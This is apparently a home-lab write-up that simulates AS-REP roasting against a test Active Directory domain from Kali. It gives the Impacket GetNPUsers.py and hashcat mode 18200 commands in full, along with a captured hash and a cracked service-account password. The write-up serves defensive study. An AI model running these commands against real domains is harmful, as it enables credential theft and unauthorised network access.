# 02 — Attack Simulation (Kali, actual)
Attacker: `butch@butch` (Kali), observed IP `192.168.100.107`. Tool: Impacket `GetNPUsers.py` v0.13.1.

## Step 1 — Time sync (Kerberos < 5 min skew)
📸 `evidence/00-kali-time-sync.png`
```bash
sudo systemctl stop systemd-timesyncd
sudo ntpdate 192.168.100.105
# 2026-11-04 09:42:05.476523 (-0500) -180.107310 +/- 0.014434 192.168.100.105 s3 no-leap
# CLOCK: time stepped by -180.107310   (Kali was ~3 min FAST vs DC)
sudo date   # Wed Nov 4 09:42:05 AM EST 2026
```
Kali was ~180 s ahead of the DC — inside the 5-min Kerberos tolerance but close; syncing avoids `KRB_AP_ERR_SKEW`.

## Step 2 — Enumerate + roast (one command with `-request`)
📸 `evidence/02-kali-getnpusers-roast.png`
```bash
GetNPUsers.py bryll.local/jdoe:'P@ssw0rd' -dc-ip 192.168.100.105 \
  -request -format hashcat -outputfile asrep_hashes.txt
```
- `jdoe` (low-priv, `P@ssw0rd`) is used only for LDAP bind/enumeration.
- `-request` sends an AS-REQ **without pre-authentication** for every account flagged `DONT_REQUIRE_PREAUTH` and captures the AS-REP.
- Output (actual):

| Name | MemberOf | PasswordLastSet | LastLogon | UAC |
|---|---|---|---|---|
| `svc_file` | — | `2026-11-04 09:37:10.791566` | `<never>` | **`0x410200`** |

`UAC 0x410200` includes `0x400000` = `DONT_REQUIRE_PREAUTH` → roasts immediately.

Captured hash (structure; full hex in `evidence/02-kali-getnpusers-roast.png`):
```
$krb5asrep$23$svc_file@BRYLL.LOCAL:ed31b62c081173a76b40353846dbae46$d215bc171f2279e2...[truncated]...a130baccaa6971571
```
- `$krb5asrep$` = AS-REP hash format; `$23$` = etype 23 (RC4-HMAC) — encrypted with `svc_file`'s NTLM key → crackable offline.
- `cat asrep_hashes.txt` confirmed the hash written to disk.

## Step 3 — Crack offline
📸 `evidence/03-kali-hashcat-cracked.png`
```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --show
```
Actual result:
| Field | Value |
|---|---|
| Hash.Mode | **18200** (Kerberos 5, etype 23, AS-REP) |
| Status | **Cracked** |
| Recovered | **1/1 (100%)** |
| Guess.Base | `/usr/share/wordlists/rockyou.txt` |
| Speed | 325.0 kH/s (Accel:1024, Pure Kernel) |
| Progress | 36864 / 14344385 (**0.26%** — cracked near the top of rockyou) |
| Time | Started `Wed Nov 4 09:44:37 2026` → Stopped `09:45:16` (~39 s) |
| **Plaintext** | **`Password123`** |

**Post-crack impact:** attacker now holds a valid domain credential (`svc_file` / `Password123`) — can log on, enumerate further, access any share/resource `svc_file` has rights to, and use it as a foothold for lateral movement. No alert fired during the attack.
